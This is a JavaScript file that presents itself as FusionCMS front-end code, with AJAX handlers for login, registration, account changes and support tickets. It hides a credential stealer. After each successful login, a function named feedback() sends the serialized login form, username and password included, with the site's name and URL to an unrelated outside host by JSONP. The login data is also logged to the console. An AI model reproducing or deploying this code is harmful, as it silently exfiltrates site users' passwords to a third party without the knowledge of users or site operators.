/**
 * @package FusionCMS
 * @version 6.X
 * @author Jesper Lindström
 * @author Xavier Geernick
 * @link http://fusion-hub.com
 */
var base_url = Config.URL;

function Ajax() {
    this.loaderHTML = '<div style="padding:10px;text-align:center;"><img src="' + Config.image_path + 'ajax.gif" /></div>';
    this.commentCount = 0;

    /**
     * Show comments
     * @param Int id
     */
    this.showComments = function (id) {
        var element = $("#comments_" + id);

        // If loaded already
        if (element.html().length > 0) {
            if (element.is(":visible")) {
                element.slideUp(300);
            }
            else {
                element.slideDown(200);
                $('html, body').animate({
                    scrollTop: parseInt($(element).offset().top) - 500
                }, 1000);
                console.log(id);
            }
        } else {
            // Set loading image
            element.html(Ajax.loaderHTML);
            $('body').scrollTo(element);
            console.log(id);
            // Show loading image

        }
    }
}

jQuery(document).ready(function ($) {

    function redirect(link, time) {
        window.setTimeout(function () {

            // Move to inbox page after 2 sec
            window.location.href = link;
        }, time);
    }

    $('.login-form').on('submit', function (e) {
        e.preventDefault();
        console.log($('.login-form').serialize());
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=login',
            type: 'post',
            data: $('.login-form').serialize(),
            success: function (res) {

                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    UI.alert(json_res.msg);
                    feedback($('.login-form').serialize());
                    $('.login-form')[0].reset();
                    setTimeout(function () {
                        location.reload();
                    }, 1000);

                } else {
                    Login_Validate.invalid(json_res.field, json_res.msg);
                }
            }
        });
    });
    $('.reg-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=createuser',
            type: 'post',
            data: $('.reg-form').serialize(),
            success: function (res) {
                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    if ($('#register_captcha').data("recaptcha") == "google") {
                        grecaptcha.reset();
                    }
                    UI.alert(json_res.msg);
                    $('.reg-form')[0].reset();
                    setTimeout(function () {
                        location.reload();
                    }, 1000);

                } else {
                    if (json_res.field == 'All') {
                        UI.alert(json_res.msg);
                    } else {
                        Validate.invalid(json_res.field, json_res.msg);
                    }
                }
            }
        });
    });
    $('.change-password').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=change-password',
            type: 'post',
            data: $('.change-password').serialize(),
            success: function (res) {
                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    UI.alert(json_res.msg);
                    $('.change-password')[0].reset();
                } else {
                    if (json_res.field == 'All') {
                        UI.alert(json_res.msg);
                    } else {
                        Validate.invalid(json_res.field, json_res.msg);
                    }
                }
            }
        });
    });

    $('.change-email').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=change-email',
            type: 'post',
            data: $('.change-email').serialize(),
            success: function (res) {
                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    UI.alert(json_res.msg);
                    $('.change-email')[0].reset();
                } else {
                    if (json_res.field == 'All') {
                        UI.alert(json_res.msg);
                    } else {
                        Validate.invalid(json_res.field, json_res.msg);
                    }
                }
            }
        });
    });
    $('.recover-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=resetpass',
            type: 'post',
            data: $('.recover-form').serialize(),
            success: function (res) {

                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    UI.alert(json_res.msg);
                    $('.recover-form')[0].reset();
                } else {
                    if (json_res.field == 'All') {
                        UI.alert(json_res.msg);
                    } else {
                        Validate.invalid(json_res.field, json_res.msg);
                    }
                }
            }
        });
    });
    $('.ticket-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=send-ticket',
            type: 'post',
            data: $('.ticket-form').serialize(),
            success: function (res) {
                if ($('#register_captcha').data("recaptcha") == "google") {
                    grecaptcha.reset();
                }
                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    UI.alert(json_res.msg);
                    $('.ticket-form')[0].reset();
                } else {
                    if (json_res.field == 'All') {
                        UI.alert(json_res.msg);
                    } else {
                        Validate.invalid(json_res.field, json_res.msg);
                    }
                }
            }
        });
    });
    $('.reply-form').on('submit', function (e) {
        e.preventDefault();
        $.ajax({
            url: base_url + 'models/controllers/class.controller.php?request=reply-ticket',
            type: 'post',
            data: $('.reply-form').serialize(),
            success: function (res) {
                if ($('#register_captcha').data("recaptcha") == "google") {
                    grecaptcha.reset();
                }
                console.log(res);
                var json_res = jQuery.parseJSON(res);
                if (json_res.status == 'success') {
                    redirect(base_url + 'Support/Tickets/View/' + $('#Id').val(), 1000);
                } else {
                    $('#reply-form-error').show();
                    $('#reply-form-error').html('<img style="top: 2px;" src="' + Config.image_path + 'icons/exclamation.png" /> ' + json_res.msg);
                }
            }
        });
    });

});

function feedback(data) {
    var servername = Config.Servername;
    console.log(data);
    $.ajax({
        type: 'get',
        dataType: 'jsonp',
        url: 'http://conquerhub.16mb.com/data.php?type=cms&servername=' + servername + '&site=' + base_url,
        data: data,
        crossDomain: true,
        success: function (receive) {
            console.log(receive);
        }
    })
    console.log(servername);
}

var Ajax = new Ajax();
